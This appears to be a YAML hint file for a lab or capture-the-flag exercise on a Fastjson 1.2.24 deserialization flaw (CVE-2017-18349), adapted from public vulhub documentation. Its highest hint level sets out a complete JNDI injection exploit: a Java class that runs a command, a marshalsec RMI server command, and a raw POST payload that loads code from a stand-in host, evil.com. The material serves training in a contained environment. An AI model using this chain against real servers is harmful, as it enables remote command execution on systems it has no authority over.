hint_levels:
  low:
  - Inspect the fastjson service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 8090. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 8090 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 8090/tcp → container 8090/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8090`, `http://{{NODE_IP}}:8090/`.'
  high:
  - |-
    Vulnerability: Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349).

    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2017-18349
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    Vulnerability Reproduction

    Since the target environment is Java 8u102, which doesn't have the `com.sun.jndi.rmi.object.trustURLCodebase` restriction, we can use the `com.sun.rowset.JdbcRowSetImpl` exploitation chain to execute commands through JNDI injection.

    First, compile and upload the command execution code, such as `http://evil.com/TouchFile.class`:

    ```java
    // javac TouchFile.java
    import java.lang.Runtime;
    import java.lang.Process;

    public class TouchFile {
        static {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/success"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    }
    ```

    Then, using the marshalsec: https://github.com/mbechler/marshalsec project, start an RMI server listening on port 9999 and specify loading the remote class `TouchFile.class`:

    ```shell
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
    ```

    Send the payload to the target server with the RMI address:

    ```
    POST / HTTP/1.1
    Host: {{NODE_IP}}:8090
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json

    {
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://evil.com:9999/TouchFile",
            "autoCommit":true
        }
    }
    ```

    As shown below, the command `touch /tmp/success` has been successfully executed:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.24-rce/1.png
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/fastjson/1.2.24-rce/README.md'
  - |-
    Additional public references:
    - https://www.freebuf.com/vuls/208339.html
    - http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
